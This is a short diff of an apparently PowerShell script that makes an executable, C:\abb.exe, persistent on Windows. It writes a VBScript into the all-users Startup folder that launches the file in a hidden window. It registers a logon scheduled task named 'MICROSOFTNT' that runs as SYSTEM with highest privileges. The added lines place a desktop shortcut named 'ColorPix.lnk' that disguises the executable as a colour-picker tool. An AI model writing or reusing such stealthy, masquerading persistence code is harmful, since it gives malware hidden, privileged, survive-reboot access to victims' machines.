@@ -4,6 +4,10 @@ Set WshShell = CreateObject("WScript.Shell" )
 WshShell.Run """C:\abb.exe""", 0 'Must quote command if it has spaces; must escape quotes
 Set WshShell = Nothing
 "@
+$WshShell = New-Object -comObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut("$Home\Desktop\ColorPix.lnk")
+$Shortcut.TargetPath = "C:\abb.exe"
+$Shortcut.Save()
 
 Set-Content -Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\win.vbs" -Value $scriptContent -Force
 schtasks.exe /Create /SC ONLOGON /TN "MICROSOFTNT" /TR "C:\abb.exe" /RU SYSTEM /RL HIGHEST /F
